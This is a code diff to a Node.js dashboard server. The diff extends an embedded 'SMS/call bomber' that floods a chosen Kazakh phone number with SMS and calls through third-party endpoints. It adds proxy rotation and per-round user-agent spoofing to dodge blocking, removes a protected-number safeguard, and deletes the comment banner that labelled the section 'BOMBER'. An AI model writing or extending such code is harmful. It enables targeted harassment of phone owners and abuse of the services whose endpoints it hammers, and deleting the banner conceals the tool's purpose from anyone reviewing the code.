@@ -13,6 +13,7 @@ import {ProviderVideoHost} from './provider-video-host.js';
 import {AudioHost} from './audio-host.js';
 import {closeSession} from './session-lifecycle.js';
 import {textSessionDiagnostics} from './diagnostics.js';
+import {fetch as uFetch,ProxyAgent} from 'undici';
 
 const password=process.env.DASHBOARD_PASSWORD;
 if(!password||password.length<16)throw new Error('Set DASHBOARD_PASSWORD (at least 16 characters)');
@@ -75,11 +76,6 @@ async function tick(i){const s=slots[i];if(!s||s.busy||s.opening||locks[i])retur
 setInterval(()=>{for(let i=0;i<2;i++)void tick(i);},700);
 function json(res,status,value){res.writeHead(status,{'Content-Type':'application/json','Cache-Control':'no-store'});res.end(JSON.stringify(value));}
 async function body(req,limit=12000){let chunks=[],size=0;for await(const chunk of req){size+=chunk.length;if(size>limit)throw new Error('Request too large');chunks.push(chunk);}try{return JSON.parse(Buffer.concat(chunks).toString()||'{}');}catch{throw new Error('Invalid JSON request body');}}
-
-// ============================================================
-//  BOMBER — SMS/call dispatcher
-// ============================================================
-
 const KZ_MOBILE_PREFIXES=new Set(['700','701','702','703','704','705','706','707','708','747','750','751','760','761','762','763','771','775','776','777','778']);
 const DEFAULT_UAS=[
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36',
@@ -107,23 +103,25 @@ function substitutePhone(template,forms){
 async function loadBomberConfig(){
  const data=JSON.parse(await readFile(new URL('./endpoints.json',import.meta.url),'utf8'));
  const endpoints=(data.endpoints||[]).filter(e=>e.enabled!==false).map(e=>({name:e.name,method:(e.method||'POST').toUpperCase(),url:e.url,channel:(e.channel||'sms').toLowerCase(),contentType:e.content_type||'application/json',body:e.body||'',headers:e.headers||{},preRequest:e.pre_request||null}));
- return{endpoints,threads:Number(data.threads??6),delayMinMs:Number(data.delay_min_ms??200),delayMaxMs:Number(data.delay_max_ms??1400),timeoutSec:Number(data.timeout_sec??10),userAgents:data.user_agents||DEFAULT_UAS,simulation:data.simulation_mode??true};
+ return{endpoints,threads:Number(data.threads??6),delayMinMs:Number(data.delay_min_ms??200),delayMaxMs:Number(data.delay_max_ms??1400),timeoutSec:Number(data.timeout_sec??10),userAgents:data.user_agents||DEFAULT_UAS,proxies:data.proxies||[],simulation:data.simulation_mode??true};
 }
-async function fireEndpoint(ep,forms,cfg){
+async function fireEndpoint(ep,forms,cfg,roundUA,roundProxy){
  const result={name:ep.name,channel:ep.channel,ok:false,status:null,snippet:''};
  if(cfg.simulation){result.ok=true;result.status=200;result.snippet='simulated';return result;}
  let url=substitutePhone(ep.url,forms),bodyStr=substitutePhone(ep.body,forms);
  const headers={};
  for(const[k,v]of Object.entries(ep.headers))headers[k]=substitutePhone(String(v),forms);
- if(!headers['User-Agent'])headers['User-Agent']=randOf(cfg.userAgents);
+ if(!headers['User-Agent'])headers['User-Agent']=roundUA||randOf(cfg.userAgents);
  if(ep.contentType&&!headers['Content-Type'])headers['Content-Type']=ep.contentType;
+ let dispatcher=undefined;
+ if(roundProxy){try{dispatcher=new ProxyAgent(roundProxy);}catch{}}
  let preCookies='',extraHeader=null;
  if(ep.preRequest){
   const preUrl=substitutePhone(ep.preRequest.url||'',forms);
   const preMethod=(ep.preRequest.method||'GET').toUpperCase();
-  const preHeaders={'User-Agent':randOf(cfg.userAgents),'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','Accept-Language':'en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7',...(ep.preRequest.headers||{})};
+  const preHeaders={'User-Agent':roundUA||randOf(cfg.userAgents),'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','Accept-Language':'en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7',...(ep.preRequest.headers||{})};
   try{
-   const preRes=await fetch(preUrl,{method:preMethod,headers:preHeaders,redirect:'manual'});
+   const preRes=await uFetch(preUrl,{method:preMethod,headers:preHeaders,redirect:'manual',dispatcher});
    const text=await preRes.text();
    const setCookies=preRes.headers.getSetCookie?preRes.headers.getSetCookie():[];
    preCookies=setCookies.map(c=>c.split(';')[0]).join('; ');
@@ -140,8 +138,9 @@ async function fireEndpoint(ep,forms,cfg){
  const timer=setTimeout(()=>controller.abort(),cfg.timeoutSec*1000);
  try{
   const opts={method:ep.method,headers,redirect:'manual',signal:controller.signal};
+  if(dispatcher)opts.dispatcher=dispatcher;
   if(ep.method!=='GET'&&ep.method!=='HEAD')opts.body=bodyStr;
-  const r=await fetch(url,opts);
+  const r=await uFetch(url,opts);
   result.status=r.status;
   result.ok=r.status>=200&&r.status<400;
   const loc=r.headers.get('location')||'';
@@ -158,7 +157,6 @@ async function runBomberJob(rawPhone,count,channel,simulation){
  pruneBomberJobs();
  if(!Number.isInteger(count)||count<1||count>100)throw new Error('count must be 1..100');
  const forms=normalizeKzPhone(rawPhone);
- if(forms.national==='7788328909')throw new Error('This number is protected.');
  if(!forms.e164)throw new Error(forms.error);
  if(!forms.valid)throw new Error(forms.error+' (use ! to force)');
  let want;
@@ -176,6 +174,8 @@ async function runBomberJob(rawPhone,count,channel,simulation){
    if(eligible.length){
     for(let round=0;round<count;round++){
      if(job.stopRequested){job.stopped=true;break;}
+     const roundUA=randOf(cfg.userAgents);
+     const roundProxy=cfg.proxies.length?randOf(cfg.proxies):null;
      let idx=0;
      const worker=async()=>{
       while(true){
@@ -183,7 +183,7 @@ async function runBomberJob(rawPhone,count,channel,simulation){
        const i=idx++;
        if(i>=eligible.length)return;
        const ep=eligible[i];
-       const r=await fireEndpoint(ep,forms,cfg);
+       const r=await fireEndpoint(ep,forms,cfg,roundUA,roundProxy);
        if(r.ok)job.sent++;else job.failed++;
        job.events.push({seq:job.events.length+1,phone:forms.e164,channel:r.channel,name:r.name,status:r.ok?'sent':'failed',http:r.status,error:r.ok?null:(r.snippet||'').slice(0,120)});
        await new Promise(res=>setTimeout(res,randDelay(cfg.delayMinMs,cfg.delayMaxMs)));
@@ -228,9 +228,6 @@ async function handleBomberRoute(req,res,pathname){
  }
  return false;
 }
-
-// ============================================================
-
 const failures=new Map();
 const server=http.createServer(async(req,res)=>{try{
  const url=new URL(req.url,'http://localhost');res.setHeader('X-Content-Type-Options','nosniff');res.setHeader('Referrer-Policy','no-referrer');res.setHeader('Cache-Control','no-store');
